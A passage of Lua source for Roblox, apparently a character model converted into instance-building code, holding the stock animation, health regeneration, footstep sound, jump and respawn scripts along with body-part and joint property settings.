Humanoid.Jumping:connect(onJumping)
Humanoid.Climbing:connect(onClimbing)
Humanoid.GettingUp:connect(onGettingUp)
Humanoid.FreeFalling:connect(onFreeFall)
Humanoid.FallingDown:connect(onFallingDown)
Humanoid.Seated:connect(onSeated)
Humanoid.PlatformStanding:connect(onPlatformStanding)
Humanoid.Swimming:connect(onSwimming)

-- setup emote chat hook
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
	local emote = ""
	if msg == "/e dance" then
		emote = dances[math.random(1, #dances)]
	elseif (string.sub(msg, 1, 3) == "/e ") then
		emote = string.sub(msg, 4)
	elseif (string.sub(msg, 1, 7) == "/emote ") then
		emote = string.sub(msg, 8)
	end
	
	if (pose == "Standing" and emoteNames[emote] ~= nil) then
		playAnimation(emote, 0.1, Humanoid)
	end

end)


-- main program

-- initialize to idle
playAnimation("idle", 0.1, Humanoid)
pose = "Standing"

while Figure.Parent ~= nil do
	local _, time = wait(0.1)
	move(time)
end



end))
NumberValue33.Name = "ScaleDampeningPercent"
NumberValue33.Parent = LocalScript32
NumberValue33.Value = 0.3999999761581421
StringValue34.Name = "sit"
StringValue34.Parent = LocalScript32
Animation35.Name = "SitAnim"
Animation35.Parent = StringValue34
Animation35.AnimationId = "http://www.roblox.com/asset/?id=178130996"
StringValue36.Name = "fall"
StringValue36.Parent = LocalScript32
Animation37.Name = "FallAnim"
Animation37.Parent = StringValue36
Animation37.AnimationId = "http://www.roblox.com/asset/?id=180436148"
StringValue38.Name = "toolnone"
StringValue38.Parent = LocalScript32
Animation39.Name = "ToolNoneAnim"
Animation39.Parent = StringValue38
Animation39.AnimationId = "http://www.roblox.com/asset/?id=182393478"
StringValue40.Name = "climb"
StringValue40.Parent = LocalScript32
Animation41.Name = "ClimbAnim"
Animation41.Parent = StringValue40
Animation41.AnimationId = "http://www.roblox.com/asset/?id=180436334"
StringValue42.Name = "jump"
StringValue42.Parent = LocalScript32
Animation43.Name = "JumpAnim"
Animation43.Parent = StringValue42
Animation43.AnimationId = "http://www.roblox.com/asset/?id=125750702"
StringValue44.Name = "run"
StringValue44.Parent = LocalScript32
Animation45.Name = "RunAnim"
Animation45.Parent = StringValue44
Animation45.AnimationId = "http://www.roblox.com/asset/?id=180426354"
StringValue46.Name = "walk"
StringValue46.Parent = LocalScript32
Animation47.Name = "WalkAnim"
Animation47.Parent = StringValue46
Animation47.AnimationId = "http://www.roblox.com/asset/?id=180426354"
StringValue48.Name = "idle"
StringValue48.Parent = LocalScript32
Animation49.Name = "Animation2"
Animation49.Parent = StringValue48
Animation49.AnimationId = "http://www.roblox.com/asset/?id=180435792"
NumberValue50.Name = "Weight"
NumberValue50.Parent = Animation49
NumberValue50.Value = 1
Animation51.Name = "Animation1"
Animation51.Parent = StringValue48
Animation51.AnimationId = "http://www.roblox.com/asset/?id=180435571"
NumberValue52.Name = "Weight"
NumberValue52.Parent = Animation51
NumberValue52.Value = 9
Script53.Name = "Health"
Script53.Parent = Model31
table.insert(cors,sandbox(Script53,function()
-- Gradually regenerates the Humanoid's Health over time.

local REGEN_RATE = 1/100 -- Regenerate this fraction of MaxHealth per second.
local REGEN_STEP = 1 -- Wait this long between each regeneration step.

--------------------------------------------------------------------------------

local Character = script.Parent
local Humanoid = Character:WaitForChild'Humanoid'

--------------------------------------------------------------------------------

while true do
	while Humanoid.Health < Humanoid.MaxHealth do
		local dt = wait(REGEN_STEP)
		local dh = dt*REGEN_RATE*Humanoid.MaxHealth
		Humanoid.Health = math.min(Humanoid.Health + dh, Humanoid.MaxHealth)
	end
	Humanoid.HealthChanged:Wait()
end
end))
Script54.Name = "Sound"
Script54.Parent = Model31
table.insert(cors,sandbox(Script54,function()
--[[
	Author: @spotco
	This script creates sounds which are placed under the character head.
	These sounds are used by the "LocalSound" script.

	To modify this script, copy it to your "StarterPlayer/StarterCharacterScripts" folder keeping the same script name ("Sound").
	The default Sound script loaded for every character will then be replaced with your copy of the script.
]]--
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

local SOUND_EVENT_FOLDER_NAME = "DefaultSoundEvents"
local DEFAULT_SERVER_SOUND_EVENT_NAME = "DefaultServerSoundEvent"

local SoundEventFolder = ReplicatedStorage:FindFirstChild(SOUND_EVENT_FOLDER_NAME)
local DefaultServerSoundEvent = nil

local useSoundDispatcher = UserSettings():IsUserFeatureEnabled("UserUseSoundDispatcher")
if useSoundDispatcher then
	if not SoundEventFolder then
		SoundEventFolder = Instance.new("Folder")
		SoundEventFolder.Name = SOUND_EVENT_FOLDER_NAME
		SoundEventFolder.Archivable = false
		SoundEventFolder.Parent = ReplicatedStorage
	end

	DefaultServerSoundEvent = SoundEventFolder:FindFirstChild(DEFAULT_SERVER_SOUND_EVENT_NAME)
else
	DefaultServerSoundEvent = ReplicatedStorage:FindFirstChild(DEFAULT_SERVER_SOUND_EVENT_NAME)
end

if not DefaultServerSoundEvent then
	if useSoundDispatcher then
		DefaultServerSoundEvent = Instance.new("RemoteEvent", SoundEventFolder)
	else
		DefaultServerSoundEvent = Instance.new("RemoteEvent", ReplicatedStorage)
	end

	DefaultServerSoundEvent.Name = DEFAULT_SERVER_SOUND_EVENT_NAME
	DefaultServerSoundEvent.OnServerEvent:Connect(function() end)
end

local function CreateNewSound(name, id, looped, pitch, parent)
	local sound = Instance.new("Sound")
	sound.SoundId = id
	sound.Name = name
	sound.archivable = false
	sound.Pitch = pitch
	sound.Looped = looped
	sound.MinDistance = 5
	sound.MaxDistance = 150
	sound.Volume = 0.65
	sound.Parent = parent

	if DefaultServerSoundEvent then
		local CharacterSoundEvent = Instance.new("RemoteEvent", sound)
		CharacterSoundEvent.Name = "CharacterSoundEvent"
		CharacterSoundEvent.OnServerEvent:Connect(function(player, playing, resetPosition)
			if type(playing) ~= "boolean" then
				return
			end
			if type(resetPosition) ~= "boolean" then
				return
			end

			if player.Character ~= script.Parent then
				return
			end
			for _, p in pairs(Players:GetPlayers()) do
				if p ~= player then
					-- Connect to the dispatcher to check if the player has loaded.
					if useSoundDispatcher then
						SoundEventFolder:FindFirstChild("SoundDispatcher"):Fire(p, sound, playing, resetPosition)
					else
						DefaultServerSoundEvent:FireClient(p, sound, playing, resetPosition)
					end
				end
			end
		end)
	end
	return sound
end

local head = script.Parent:FindFirstChild("Head")
if not head then
	error("Sound script parent has no child Head.")
	return
end

CreateNewSound("GettingUp", "rbxasset://sounds/action_get_up.mp3", false, 1, head)
CreateNewSound("Died", "rbxasset://sounds/uuhhh.mp3", false, 1, head) 
CreateNewSound("FreeFalling", "rbxasset://sounds/action_falling.mp3", true, 1, head)
CreateNewSound("Jumping", "rbxasset://sounds/action_jump.mp3", false, 1, head)
CreateNewSound("Landing", "rbxasset://sounds/action_jump_land.mp3", false, 1, head)
CreateNewSound("Splash", "rbxasset://sounds/impact_water.mp3", false, 1, head)
CreateNewSound("Running", "rbxasset://sounds/action_footsteps_plastic.mp3", true, 1.85, head)
CreateNewSound("Swimming", "rbxasset://sounds/action_swim.mp3", true, 1.6, head)
CreateNewSound("Climbing", "rbxasset://sounds/action_footsteps_plastic.mp3", true, 1, head)
end))
LocalScript55.Name = "LocalSound"
LocalScript55.Parent = Script54
table.insert(cors,sandbox(LocalScript55,function()
--[[
	Author: @spotco
	This script runs locally for the player of the given humanoid.
	This script triggers humanoid sound play/pause actions locally.

	The Playing/TimePosition properties of Sound objects bypass FilteringEnabled, so this triggers the sound
	immediately for the player and is replicated to all other players.

	This script is optimized to reduce network traffic through minimizing the amount of property replication.
]]--

--All sounds are referenced by this ID
local SFX = {
	Died = 0;
	Running = 1;
	Swimming = 2;
	Climbing = 3,
	Jumping = 4;
	GettingUp = 5;
	FreeFalling = 6;
	FallingDown = 7;
	Landing = 8;
	Splash = 9;
}

local useUpdatedLocalSoundFlag = UserSettings():IsUserFeatureEnabled("UserFixCharacterSoundIssues")

local Humanoid = nil
local Head = nil
--SFX ID to Sound object
local Sounds = {}
local SoundService = game:GetService("SoundService")
local soundEventFolderName = "DefaultSoundEvents"
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local AddCharacterLoadedEvent = nil
local RemoveCharacterEvent = nil
local soundEventFolder = ReplicatedStorage:FindFirstChild(soundEventFolderName)
local useSoundDispatcher = UserSettings():IsUserFeatureEnabled("UserUseSoundDispatcher")

if useSoundDispatcher then
	if not soundEventFolder then
		soundEventFolder = Instance.new("Folder", ReplicatedStorage)
		soundEventFolder.Name = soundEventFolderName
		soundEventFolder.Archivable = false
	end
	
	-- Load the RemoveCharacterEvent
	RemoveCharacterEvent = soundEventFolder:FindFirstChild("RemoveCharacterEvent")
	if RemoveCharacterEvent == nil then
		RemoveCharacterEvent = Instance.new("RemoteEvent", soundEventFolder)
		RemoveCharacterEvent.Name = "RemoveCharacterEvent"
	end

	AddCharacterLoadedEvent = soundEventFolder:FindFirstChild("AddCharacterLoadedEvent")
	if AddCharacterLoadedEvent == nil then
		AddCharacterLoadedEvent = Instance.new("RemoteEvent", soundEventFolder)
		AddCharacterLoadedEvent.Name = "AddCharacterLoadedEvent"
	end

	-- Notify the server a new character has been loaded
	AddCharacterLoadedEvent:FireServer()

	-- Notify the sound dispatcher this character has left.
	game.Players.LocalPlayer.CharacterRemoving:connect(function(character)
		RemoveCharacterEvent:FireServer(game.Players.LocalPlayer)
	end)
end

do
	local Figure = script.Parent.Parent
	Head = Figure:WaitForChild("Head")
	while not Humanoid do
		for _,NewHumanoid in pairs(Figure:GetChildren()) do
			if NewHumanoid:IsA("Humanoid") then
				Humanoid = NewHumanoid
				break
			end
		end
		if Humanoid then break end
		Figure.ChildAdded:wait()
	end
	Sounds[SFX.Died] = 			Head:WaitForChild("Died")
	Sounds[SFX.Running] = 		Head:WaitForChild("Running")
	Sounds[SFX.Swimming] = 	Head:WaitForChild("Swimming")
	Sounds[SFX.Climbing] = 	Head:WaitForChild("Climbing")
	Sounds[SFX.Jumping] = 		Head:WaitForChild("Jumping")
	Sounds[SFX.GettingUp] = 	Head:WaitForChild("GettingUp")
	Sounds[SFX.FreeFalling] = 	Head:WaitForChild("FreeFalling")
	Sounds[SFX.Landing] = 		Head:WaitForChild("Landing")
	Sounds[SFX.Splash] = 		Head:WaitForChild("Splash")

	local DefaultServerSoundEvent = nil
	if useSoundDispatcher then
		DefaultServerSoundEvent = soundEventFolder:FindFirstChild("DefaultServerSoundEvent")
	else
		DefaultServerSoundEvent = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultServerSoundEvent")
	end

	if DefaultServerSoundEvent then
		DefaultServerSoundEvent.OnClientEvent:connect(function(sound, playing, resetPosition)
			if resetPosition and sound.TimePosition ~= 0 then
				sound.TimePosition = 0
			end
			if sound.IsPlaying ~= playing then
				sound.Playing = playing
			end
		end)
	end
end

local IsSoundFilteringEnabled = function()
	return game.Workspace.FilteringEnabled and SoundService.RespectFilteringEnabled
end

local Util
Util = {

	--Define linear relationship between (pt1x,pt2x) and (pt2x,pt2y). Evaluate this at x.
	YForLineGivenXAndTwoPts = function(x,pt1x,pt1y,pt2x,pt2y)
		--(y - y1)/(x - x1) = m
		local m = (pt1y - pt2y) / (pt1x - pt2x)
		--float b = pt1.y - m * pt1.x;
		local b = (pt1y - m * pt1x)
		return m * x + b
	end;

	--Clamps the value of "val" between the "min" and "max"
	Clamp = function(val,min,max)
		return math.min(max,math.max(min,val))	
	end;

	--Gets the horizontal (x,z) velocity magnitude of the given part
	HorizontalSpeed = function(Head)
		local hVel = Head.Velocity + Vector3.new(0,-Head.Velocity.Y,0)
		return hVel.magnitude	
	end;

	--Gets the vertical (y) velocity magnitude of the given part
	VerticalSpeed = function(Head)
		return math.abs(Head.Velocity.Y)
	end;

	--Setting Playing/TimePosition values directly result in less network traffic than Play/Pause/Resume/Stop
	--If these properties are enabled, use them.
	Play = function(sound)	
		if IsSoundFilteringEnabled() then
			sound.CharacterSoundEvent:FireServer(true, true)
		end
		if sound.TimePosition ~= 0 then
			sound.TimePosition = 0
		end
		if not sound.IsPlaying then
			sound.Playing = true
		end
	end;

	Pause = function(sound)
		if IsSoundFilteringEnabled() then
			sound.CharacterSoundEvent:FireServer(false, false)
		end
		if sound.IsPlaying then
			sound.Playing = false
		end
	end;

	Resume = function(sound)
		if IsSoundFilteringEnabled() then
			sound.CharacterSoundEvent:FireServer(true, false)
		end
		if not sound.IsPlaying then
			sound.Playing = true
		end
	end;

	Stop = function(sound)
		if IsSoundFilteringEnabled() then
			sound.CharacterSoundEvent:FireServer(false, true)
		end
		if sound.IsPlaying then
			sound.Playing = false
		end
		if sound.TimePosition ~= 0 then
			sound.TimePosition = 0
		end
	end;
}

do
	-- List of all active Looped sounds
	local playingLoopedSounds = {}

	-- Last seen Enum.HumanoidStateType
	local activeState = nil

	local fallSpeed = 0

	-- Verify and set that "sound" is in "playingLoopedSounds".
	function setSoundInPlayingLoopedSounds(sound)
		for i=1, #playingLoopedSounds do
			if playingLoopedSounds[i] == sound then
				return
			end
		end	
		table.insert(playingLoopedSounds,sound)
	end

	-- Stop all active looped sounds except parameter "except". If "except" is not passed, all looped sounds will be stopped.
	function stopPlayingLoopedSoundsExcept(except)
		for i=#playingLoopedSounds,1,-1 do
			if playingLoopedSounds[i] ~= except then
				Util.Pause(playingLoopedSounds[i])			
				table.remove(playingLoopedSounds,i)	
			end
		end
	end

	-- Table of Enum.HumanoidStateType to handling function
	local stateUpdateHandler = {
		[Enum.HumanoidStateType.Dead] = function()
			stopPlayingLoopedSoundsExcept()
			local sound = Sounds[SFX.Died]
			Util.Play(sound)
		end;

		[Enum.HumanoidStateType.RunningNoPhysics] = function(speed)
			stateUpdated(Enum.HumanoidStateType.Running, speed)
		end;

		[Enum.HumanoidStateType.Running] = function(speed)	
			local sound = Sounds[SFX.Running]
			stopPlayingLoopedSoundsExcept(sound)

			if(useUpdatedLocalSoundFlag and activeState == Enum.HumanoidStateType.Freefall and fallSpeed > 0.1) then
				-- Play a landing sound if the character dropped from a large distance
				local vol = math.min(1.0, math.max(0.0, (fallSpeed - 50) / 110))
				local freeFallSound = Sounds[SFX.FreeFalling]
				freeFallSound.Volume = vol
				Util.Play(freeFallSound)
				fallSpeed = 0
			end
			if useUpdatedLocalSoundFlag then
				if speed ~= nil and speed > 0.5 then
					Util.Resume(sound)
					setSoundInPlayingLoopedSounds(sound)
				elseif speed ~= nil then
					stopPlayingLoopedSoundsExcept()
				end
			else
				if Util.HorizontalSpeed(Head) > 0.5 then
					Util.Resume(sound)
					setSoundInPlayingLoopedSounds(sound)
				else
					stopPlayingLoopedSoundsExcept()
				end
			end
		end;

		[Enum.HumanoidStateType.Swimming] = function(speed)
		local threshold
		if useUpdatedLocalSoundFlag then threshold = speed else threshold = Util.VerticalSpeed(Head) end
			if activeState ~= Enum.HumanoidStateType.Swimming and threshold > 0.1 then
				local splashSound = Sounds[SFX.Splash]
				splashSound.Volume = Util.Clamp(
					Util.YForLineGivenXAndTwoPts(
						Util.VerticalSpeed(Head), 
						100, 0.28, 
						350, 1),
					0,1)
				Util.Play(splashSound)
			end

			do
				local sound = Sounds[SFX.Swimming]
				stopPlayingLoopedSoundsExcept(sound)
				Util.Resume(sound)
				setSoundInPlayingLoopedSounds(sound)
			end
		end;

		[Enum.HumanoidStateType.Climbing] = function(speed)
			local sound = Sounds[SFX.Climbing]
			if useUpdatedLocalSoundFlag then
				if speed ~= nil and math.abs(speed) > 0.1 then
					Util.Resume(sound)
					stopPlayingLoopedSoundsExcept(sound)
				else
					Util.Pause(sound)
					stopPlayingLoopedSoundsExcept(sound)
				end		
			else
				if Util.VerticalSpeed(Head) > 0.1 then
					Util.Resume(sound)
					stopPlayingLoopedSoundsExcept(sound)
				else
					stopPlayingLoopedSoundsExcept()
				end
			end

			setSoundInPlayingLoopedSounds(sound)
		end;

		[Enum.HumanoidStateType.Jumping] = function()
			if activeState == Enum.HumanoidStateType.Jumping then
				return
			end		
			stopPlayingLoopedSoundsExcept()
			local sound = Sounds[SFX.Jumping]
			Util.Play(sound)
		end;

		[Enum.HumanoidStateType.GettingUp] = function()
			stopPlayingLoopedSoundsExcept()
			local sound = Sounds[SFX.GettingUp]
			Util.Play(sound)
		end;

		[Enum.HumanoidStateType.Freefall] = function()
			if activeState == Enum.HumanoidStateType.Freefall then
				return
			end
			local sound = Sounds[SFX.FreeFalling]
			sound.Volume = 0
			stopPlayingLoopedSoundsExcept()

			fallSpeed = math.max(fallSpeed, math.abs(Head.Velocity.y))
		end;

		[Enum.HumanoidStateType.FallingDown] = function()
			stopPlayingLoopedSoundsExcept()
		end;

		[Enum.HumanoidStateType.Landed] = function()
			stopPlayingLoopedSoundsExcept()
			if Util.VerticalSpeed(Head) > 75 then
				local landingSound = Sounds[SFX.Landing]
				landingSound.Volume = Util.Clamp(
					Util.YForLineGivenXAndTwoPts(
						Util.VerticalSpeed(Head), 
						50, 0, 
						100, 1),
					0,1)
				Util.Play(landingSound)			
			end
		end;

		[Enum.HumanoidStateType.Seated] = function()
			stopPlayingLoopedSoundsExcept()
		end;	
	}

	

	-- Handle state event fired or OnChange fired
	function stateUpdated(state, speed)
		if stateUpdateHandler[state] ~= nil then
			if useUpdatedLocalSoundFlag and (state == Enum.HumanoidStateType.Running 
				or state == Enum.HumanoidStateType.Climbing
				or state == Enum.HumanoidStateType.Swimming
				or state == Enum.HumanoidStateType.RunningNoPhysics) then
				stateUpdateHandler[state](speed)
			else
				stateUpdateHandler[state]()
			end
		end
		activeState = state
	end

	Humanoid.Died:connect(			function() stateUpdated(Enum.HumanoidStateType.Dead) 			end)
	Humanoid.Running:connect(		function(speed) stateUpdated(Enum.HumanoidStateType.Running, speed) end)
	Humanoid.Swimming:connect(		function(speed) stateUpdated(Enum.HumanoidStateType.Swimming, speed) end)
	Humanoid.Climbing:connect(		function(speed) stateUpdated(Enum.HumanoidStateType.Climbing, speed) end)
	Humanoid.Jumping:connect(		function() stateUpdated(Enum.HumanoidStateType.Jumping) 		end)
	Humanoid.GettingUp:connect(		function() stateUpdated(Enum.HumanoidStateType.GettingUp) 		end)
	Humanoid.FreeFalling:connect(	function() stateUpdated(Enum.HumanoidStateType.Freefall) 		end)
	Humanoid.FallingDown:connect(	function() stateUpdated(Enum.HumanoidStateType.FallingDown) 	end)

	

	-- required for proper handling of Landed event

	Humanoid.StateChanged:connect(function(old, new)
		stateUpdated(new)
	end)

	

	function onUpdate(stepDeltaSeconds, tickSpeedSeconds)
		local stepScale = stepDeltaSeconds / tickSpeedSeconds
		do
			local sound = Sounds[SFX.FreeFalling]
			if activeState == Enum.HumanoidStateType.Freefall then
				if Head.Velocity.Y < 0 and Util.VerticalSpeed(Head) > 75 then
					Util.Resume(sound)

					--Volume takes 1.1 seconds to go from volume 0 to 1
					local ANIMATION_LENGTH_SECONDS = 1.1

					local normalizedIncrement = tickSpeedSeconds / ANIMATION_LENGTH_SECONDS									
					sound.Volume = Util.Clamp(sound.Volume + normalizedIncrement * stepScale, 0, 1)
				else
					sound.Volume = 0
				end			
			else
				Util.Pause(sound)
			end
		end

		do
			local sound = Sounds[SFX.Running]
			if activeState == Enum.HumanoidStateType.Running then
				if Util.HorizontalSpeed(Head) < 0.5 then
					Util.Pause(sound)
				end
			end
		end		
	end

	
	local lastTick = tick()
	local TICK_SPEED_SECONDS = 0.25
	while true do
		onUpdate(tick() - lastTick,TICK_SPEED_SECONDS)
		lastTick = tick()
		wait(TICK_SPEED_SECONDS)
	end

end

end))
Part56.Name = "HumanoidRootPart"
Part56.Parent = Model31
Part56.CFrame = CFrame.new(-24.2584229, 206.85936, 34.3602753, 0.345503986, 0, -0.938417315, 0, 1, 0, 0.938417315, 0, 0.345503986)
Part56.Orientation = Vector3.new(0, -69.78700256347656, 0)
Part56.Position = Vector3.new(-24.2584228515625, 206.85935974121094, 34.36027526855469)
Part56.Rotation = Vector3.new(0, -69.78700256347656, 0)
Part56.Color = Color3.new(0.678431, 0.678431, 0.678431)
Part56.Transparency = 1
Part56.Size = Vector3.new(2, 2, 1)
Part56.BottomSurface = Enum.SurfaceType.Smooth
Part56.BrickColor = BrickColor.new("Light grey metallic")
Part56.CanCollide = false
Part56.LeftParamA = 0
Part56.LeftParamB = 0
Part56.Locked = true
Part56.RightParamA = 0
Part56.RightParamB = 0
Part56.TopSurface = Enum.SurfaceType.Smooth
Part56.brickColor = BrickColor.new("Light grey metallic")
Part56.FormFactor = Enum.FormFactor.Symmetric
Part56.formFactor = Enum.FormFactor.Symmetric
RemoteEvent57.Name = "CharacterSoundEvent"
RemoteEvent57.Parent = Part56
Motor6D58.Name = "RootJoint"
Motor6D58.Parent = Part56
Motor6D58.MaxVelocity = 0.10000000149011612
Motor6D58.C0 = CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
Motor6D58.C1 = CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
Motor6D58.Part0 = Part56
Motor6D58.Part1 = Part70
Motor6D58.part1 = Part70
Humanoid59.Parent = Model31
Humanoid59.LeftLeg = Part64
Humanoid59.RightLeg = Part62
Humanoid59.Torso = Part56
LocalScript60.Name = "Jump"
LocalScript60.Parent = Humanoid59
table.insert(cors,sandbox(LocalScript60,function()
local Mouse = game.Players.LocalPlayer:GetMouse()
Mouse.KeyDown:connect(function(Key)
if Key == " " then
local Active = true
local Connection = Mouse.KeyUp:connect(function(Key)
if Key == " " then
Active = false
end
end)

while Active do
script.Parent.Jump = true
wait()
end
Connection:Disconnect()
end
end)
end))
Script61.Name = "Respawn"
Script61.Parent = Humanoid59
table.insert(cors,sandbox(Script61,function()
script.Parent.Died:Connect(function()
wait(5)
game.Players:WaitForChild(script.Parent.Parent.Name):LoadCharacter()
end)
end))
Part62.Name = "Right Leg"
Part62.Parent = Model31
Part62.CFrame = CFrame.new(-24.0856705, 204.85936, 34.829483, 0.345503986, 0, -0.938417315, 0, 1, 0, 0.938417315, 0, 0.345503986)
Part62.Orientation = Vector3.new(0, -69.78700256347656, 0)
Part62.Position = Vector3.new(-24.085670471191406, 204.85935974121094, 34.82948303222656)
Part62.Rotation = Vector3.new(0, -69.78700256347656, 0)
Part62.Color = Color3.new(0.678431, 0.678431, 0.678431)
Part62.Size = Vector3.new(1, 2, 1)
Part62.BottomSurface = Enum.SurfaceType.Smooth
Part62.BrickColor = BrickColor.new("Light grey metallic")
Part62.CanCollide = false
Part62.Locked = true
Part62.brickColor = BrickColor.new("Light grey metallic")
Part62.FormFactor = Enum.FormFactor.Symmetric
Part62.formFactor = Enum.FormFactor.Symmetric
RemoteEvent63.Name = "CharacterSoundEvent"
RemoteEvent63.Parent = Part62
Part64.Name = "Left Leg"
Part64.Parent = Model31
Part64.CFrame = CFrame.new(-24.4311752, 204.85936, 33.8910675, 0.345503986, 0, -0.938417315, 0, 1, 0, 0.938417315, 0, 0.345503986)
Part64.Orientation = Vector3.new(0, -69.78700256347656, 0)
Part64.Position = Vector3.new(-24.431175231933594, 204.85935974121094, 33.89106750488281)
Part64.Rotation = Vector3.new(0, -69.78700256347656, 0)
Part64.Color = Color3.new(0.678431, 0.678431, 0.678431)
Part64.Size = Vector3.new(1, 2, 1)
Part64.BottomSurface = Enum.SurfaceType.Smooth
Part64.BrickColor = BrickColor.new("Light grey metallic")
Part64.CanCollide = false
Part64.Locked = true
Part64.brickColor = BrickColor.new("Light grey metallic")
Part64.FormFactor = Enum.FormFactor.Symmetric
Part64.formFactor = Enum.FormFactor.Symmetric
RemoteEvent65.Name = "CharacterSoundEvent"
RemoteEvent65.Parent = Part64
Part66.Name = "Right Arm"
Part66.Parent = Model31
Part66.CFrame = CFrame.new(-23.7401676, 206.85936, 35.7679024, 0.345503986, 0, -0.938417315, 0, 1, 0, 0.938417315, 0, 0.345503986)
Part66.Orientation = Vector3.new(0, -69.78700256347656, 0)
Part66.Position = Vector3.new(-23.74016761779785, 206.85935974121094, 35.76790237426758)
Part66.Rotation = Vector3.new(0, -69.78700256347656, 0)
Part66.Color = Color3.new(0.678431, 0.678431, 0.678431)
Part66.Size = Vector3.new(1, 2, 1)
Part66.BrickColor = BrickColor.new("Light grey metallic")
Part66.CanCollide = false
Part66.Locked = true
Part66.brickColor = BrickColor.new("Light grey metallic")
Part66.FormFactor = Enum.FormFactor.Symmetric
Part66.formFactor = Enum.FormFactor.Symmetric
RemoteEvent67.Name = "CharacterSoundEvent"
RemoteEvent67.Parent = Part66
Part68.Name = "Left Arm"
Part68.Parent = Model31
Part68.CFrame = CFrame.new(-24.7766781, 206.85936, 32.9526482, 0.345503986, 0, -0.938417315, 0, 1, 0, 0.938417315, 0, 0.345503986)
Part68.Orientation = Vector3.new(0, -69.78700256347656, 0)
Part68.Position = Vector3.new(-24.77667808532715, 206.85935974121094, 32.9526481628418)
Part68.Rotation = Vector3.new(0, -69.78700256347656, 0)
Part68.Color = Color3.new(0.678431, 0.678431, 0.678431)
Part68.Size = Vector3.new(1, 2, 1)
Part68.BrickColor = BrickColor.new("Light grey metallic")
Part68.CanCollide = false
Part68.Locked = true
Part68.brickColor = BrickColor.new("Light grey metallic")
Part68.FormFactor = Enum.FormFactor.Symmetric
Part68.formFactor = Enum.FormFactor.Symmetric
RemoteEvent69.Name = "CharacterSoundEvent"
RemoteEvent69.Parent = Part68
Part70.Name = "Torso"
Part70.Parent = Model31
Part70.CFrame = CFrame.new(-24.2584229, 206.85936, 34.3602753, 0.345503986, 0, -0.938417315, 0, 1, 0, 0.938417315, 0, 0.345503986)
Part70.Orientation = Vector3.new(0, -69.78700256347656, 0)
Part70.Position = Vector3.new(-24.2584228515625, 206.85935974121094, 34.36027526855469)
Part70.Rotation = Vector3.new(0, -69.78700256347656, 0)
Part70.Color = Color3.new(0.678431, 0.678431, 0.678431)
Part70.Size = Vector3.new(2, 2, 1)
Part70.BrickColor = BrickColor.new("Light grey metallic")
Part70.LeftParamA = 0
Part70.LeftParamB = 0
Part70.LeftSurface = Enum.SurfaceType.Weld
Part70.Locked = true
Part70.RightParamA = 0
Part70.RightParamB = 0
Part70.RightSurface = Enum.SurfaceType.Weld
Part70.brickColor = BrickColor.new("Light grey metallic")
Part70.FormFactor = Enum.FormFactor.Symmetric
Part70.formFactor = Enum.FormFactor.Symmetric
Decal71.Name = "roblox"
Decal71.Parent = Part70
RemoteEvent72.Name = "CharacterSoundEvent"
RemoteEvent72.Parent = Part70
Motor6D73.Name = "Left Shoulder"
Motor6D73.Parent = Part70
Motor6D73.MaxVelocity = 0.10000000149011612
Motor6D73.C0 = CFrame.new(-1, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
Motor6D73.C1 = CFrame.new(0.5, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
Motor6D73.Part0 = Part70
Motor6D73.Part1 = Part68
Motor6D73.part1 = Part68
Motor6D74.Name = "Right Hip"
Motor6D74.Parent = Part70
Motor6D74.MaxVelocity = 0.10000000149011612
Motor6D74.C0 = CFrame.new(1, -1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
Motor6D74.C1 = CFrame.new(0.5, 1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
Motor6D74.Part0 = Part70
Motor6D74.Part1 = Part62
Motor6D74.part1 = Part62
Motor6D75.Name = "Right Shoulder"
Motor6D75.Parent = Part70
Motor6D75.MaxVelocity = 0.10000000149011612
Motor6D75.C0 = CFrame.new(1, 0.5, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
Motor6D75.C1 = CFrame.new(-0.5, 0.5, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
Motor6D75.Part0 = Part70
Motor6D75.Part1 = Part66
Motor6D75.part1 = Part66
Motor6D76.Name = "Neck"
Motor6D76.Parent = Part70
Motor6D76.MaxVelocity = 0.10000000149011612
Motor6D76.C0 = CFrame.new(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
Motor6D76.C1 = CFrame.new(0, -0.5, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
Motor6D76.Part0 = Part70
Motor6D76.Part1 = Part78
Motor6D76.part1 = Part78
Motor6D77.Name = "Left Hip"
Motor6D77.Parent = Part70
Motor6D77.MaxVelocity = 0.10000000149011612
Motor6D77.C0 = CFrame.new(-1, -1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
Motor6D77.C1 = CFrame.new(-0.5, 1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
Motor6D77.Part0 = Part70
Motor6D77.Part1 = Part64
Motor6D77.part1 = Part64
Part78.Name = "Head"
Part78.Parent = Model31
Part78.CFrame = CFrame.new(-24.2584229, 208.35936, 34.3602753, 0.345503986, 0, -0.938417315, 0, 1, 0, 0.938417315, 0, 0.345503986)
Part78.Orientation = Vector3.new(0, -69.78700256347656, 0)
Part78.Position = Vector3.new(-24.2584228515625, 208.35935974121094, 34.36027526855469)
Part78.Rotation = Vector3.new(0, -69.78700256347656, 0)
Part78.Color = Color3.new(0.678431, 0.678431, 0.678431)
Part78.Size = Vector3.new(2, 1, 1)
Part78.BrickColor = BrickColor.new("Light grey metallic")
Part78.Locked = true
Part78.TopSurface = Enum.SurfaceType.Smooth
Part78.brickColor = BrickColor.new("Light grey metallic")
Part78.FormFactor = Enum.FormFactor.Symmetric
Part78.formFactor = Enum.FormFactor.Symmetric
Decal79.Name = "face"
Decal79.Parent = Part78
Decal79.Texture = "rbxassetid://144080495"
Sound80.Name = "Climbing"
Sound80.Parent = Part78
Sound80.Looped = true
Sound80.MaxDistance = 150
Sound80.EmitterSize = 5
Sound80.MinDistance = 5
Sound80.SoundId = "rbxasset://sounds/action_footsteps_plastic.mp3"
Sound80.Volume = 0.6499999761581421
RemoteEvent81.Name = "CharacterSoundEvent"
RemoteEvent81.Parent = Sound80
